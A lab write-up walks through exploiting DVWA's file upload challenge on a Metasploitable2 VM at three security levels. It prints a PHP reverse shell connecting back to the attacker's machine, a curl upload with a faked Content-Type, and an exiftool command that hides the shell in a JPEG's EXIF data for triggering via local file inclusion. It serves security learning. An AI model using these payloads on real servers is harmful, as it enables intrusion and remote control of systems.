# DVWA File Upload – Metasploitable2

**Target:** Metasploitable2 (<TARGET_IP>)
**Attacker:** Kali Linux
**Category:** File Upload + Local File Inclusion
**App:** DVWA (Damn Vulnerable Web Application)

---

## How It Works

File upload vulnerabilities happen when a web app lets you upload files without properly checking what they are. If you can upload a PHP file to a web server that runs PHP, you can execute whatever code you want. The server sees the `.php` extension, hands it to the PHP interpreter, and your code runs.

DVWA has three security levels for this challenge. Each one adds more restrictions on what you can upload, but each one can be bypassed.

---

## The Reverse Shell

Same PHP reverse shell for all three levels. Create a file called `shell.php`:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'"); ?>
```

Replace `<KALI_IP>` with your Kali IP (find it with `ip a`). This tells the target to open a bash shell and redirect all input/output over TCP back to your machine on port 4444.

Has to be PHP because that's what Apache on Metasploitable is configured to execute. Upload a `.py` or `.sh` and the server just shows it as text. PHP is the only language the web server will actually run.

---

## Low Security

No filtering at all. Just upload the PHP file directly.

**1. Set DVWA Security to Low** (DVWA Security page in the menu).

**2. Start the listener:**

```bash
nc -lvnp 4444
```

**3. Upload `shell.php`** through the File Upload page in the browser. DVWA responds with:

```
../../hackable/uploads/shell.php succesfully uploaded!
```

That response tells you exactly where the file landed. Important because on a real target you'd have to figure out the upload directory yourself (with gobuster, dirb, or by reading the HTML source).

**4. Trigger the shell** by visiting the uploaded file:

```
http://<TARGET_IP>/dvwa/hackable/uploads/shell.php
```

The listener catches the connection and you've got a shell as `www-data`.

---

## Medium Security

Medium adds a MIME type check. The server looks at the `Content-Type` header in the upload request and only allows image types like `image/jpeg` or `image/png`. Upload a `.php` file through the browser and it sends `Content-Type: application/x-php` which gets rejected:

```
Your image was not uploaded.
```

### The Bypass

The MIME type comes from the browser, not from the file itself. It's just an HTTP header that we can set to whatever we want. The server trusts it blindly.

**1. Grab your DVWA session cookie.** In the browser: F12 → Storage (Firefox) or Application (Chrome) → Cookies → copy the `PHPSESSID` value.

**2. Upload with curl, faking the Content-Type:**

```bash
curl -b "PHPSESSID=YOUR_COOKIE;security=medium" \
  -F "uploaded=@shell.php;type=image/jpeg" \
  -F "Upload=Upload" \
  "http://<TARGET_IP>/dvwa/vulnerabilities/upload/"
```

Breaking that down:

- `-b` sets the cookies. You need the session cookie to stay logged in, and `security=medium` to hit the right security level.
- `-F "uploaded=@shell.php;type=image/jpeg"` uploads `shell.php` but tells the server the Content-Type is `image/jpeg`. The `uploaded` field name comes from the HTML form (`<input name="uploaded">`).
- `-F "Upload=Upload"` is the submit button value, also from the HTML form.

The field names (`uploaded`, `Upload`) come from reading the page source. Right-click → View Source on the upload page and look at the `<form>` and `<input>` tags. The `name` attributes tell you exactly what curl parameters to use.

**3. Trigger the shell** the same way as Low:

```
http://<TARGET_IP>/dvwa/hackable/uploads/shell.php
```

---

## High Security

High checks the actual file extension. Only `.jpg`, `.jpeg`, `.png`, and `.gif` are allowed. You can't just rename a PHP file or fake a Content-Type. The server also checks for valid image magic bytes at the start of the file. So you need a real image file with real image headers.

### The Trick: PHP in EXIF Data

Image files have metadata (EXIF data) that can contain arbitrary text in comment fields. PHP's `include()` function doesn't care about the file extension. It reads the entire file and executes any `<?php ... ?>` tags it finds, even if the rest of the file is binary image data.

**1. Create a real image:**

```bash
convert -size 1x1 xc:white white.JPG
```

If `convert` (ImageMagick) isn't installed:

```bash
python3 -c "
from PIL import Image
img = Image.new('RGB', (1,1), 'white')
img.save('white.JPG')
"
```

**2. Inject PHP into the EXIF comment:**

```bash
exiftool -Comment='<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1\""); ?>' white.JPG
```

**3. Verify it's in there:**

```bash
exiftool white.JPG | grep Comment
```

Should show the full PHP payload in the Comment field.

**4. Upload `white.JPG`** through DVWA File Upload. It passes all checks because it's a real JPEG with valid headers and a `.JPG` extension.

**5. Trigger it via Local File Inclusion.** This is the key part. You can't just visit the JPG directly because Apache sees `.JPG` and serves it as an image. The PHP code never gets executed. You need DVWA's File Inclusion vulnerability to load it with `include()`:

```
http://<TARGET_IP>/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/white.JPG
```

When `include()` processes the file, it reads through the JPEG binary data (which shows up as garbage characters in the browser) and when it hits the `<?php ... ?>` tags in the EXIF comment, it executes them.

### Direct Access vs LFI

| Method | What Happens |
|--------|-------------|
| `/uploads/white.JPG` directly | Apache sees `.JPG` → serves as image → PHP not executed ❌ |
| Via LFI `include()` | PHP reads file contents → finds `<?php` → executes code ✅ |

### How to Tell if include() Is Working

When you visit the LFI URL, you'll see a wall of garbled characters (the raw JPEG binary data rendered as text). That's `include()` dumping the file contents. If you saw a clean white image instead, that would mean the server is serving the file as an image, not including it, and the PHP won't execute.

---

## The Full Attack Chain

```
Low:    shell.php → upload → visit URL → shell
Medium: shell.php → curl with fake Content-Type → visit URL → shell
High:   real JPG + PHP in EXIF → upload → trigger via LFI → shell
```

Each level adds a restriction, and each bypass gets more creative. Low is wide open. Medium trusts the client-sent MIME type. High requires chaining two separate vulnerabilities together (file upload + LFI) because neither one alone is enough.

---

## What I Learned

PHP reverse shells have to be in PHP because that's what the web server executes. You can call any language from inside PHP using `exec()`, `system()`, or `passthru()`, but the wrapper file has to be `.php` (or triggered via `include()`) for the server to process it.

MIME type checks are useless as a security measure. The Content-Type header is set by the client and can be changed to anything with curl or Burp Suite. The server should be checking the actual file contents, not trusting what the browser tells it.

EXIF data in images can carry arbitrary payloads. `exiftool -Comment='...'` lets you embed any text into an image's metadata. The image stays valid and passes file type checks, but the hidden code is there waiting to be triggered.

`include()` in PHP is dangerous because it executes any PHP tags it finds regardless of the file extension. A `.jpg`, `.txt`, `.log`, anything with `<?php ?>` in it will have that code run. That's why LFI (Local File Inclusion) vulnerabilities are so powerful, especially when combined with file upload.

The HTML form source code tells you everything you need for curl requests. The `name` attributes on `<input>` tags map directly to the `-F` parameters in curl. Always view source before scripting an upload.

The upload path is usually revealed in the success message. DVWA literally tells you `../../hackable/uploads/shell.php succesfully uploaded!`. On real targets you'd use directory brute forcing with gobuster or dirb to find common upload directories like `/uploads/`, `/files/`, `/images/`.

*Educational purposes only. Metasploitable2 is a deliberately vulnerable VM.*
